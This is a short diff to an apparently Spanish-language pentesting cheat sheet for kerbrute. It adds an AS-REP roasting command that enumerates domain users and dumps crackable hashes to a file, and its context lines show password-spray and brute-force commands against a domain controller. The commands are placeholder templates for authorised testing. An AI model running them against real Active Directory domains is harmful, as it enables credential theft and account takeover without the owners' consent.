@@ -30,6 +30,11 @@ kerbrute passwordspray --dc <IP-TARGET> -d <DOMAIN> <FILE-USERNAME_LIST> <PASSWO
 kerbrute bruteuser --dc <IP-TARGET> -d <DOMAIN> <FILE-USERNAME_PASSWORD_LIST>
 ```
 
+#### ASREP-Roasting Attack
+```
+kerbrute userenum -d <DOMAIN> --dc <IP-TARGET> <WORDLISTS> --hash-file hash.asreproast --downgrade
+```
+
 ---
 
 [:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
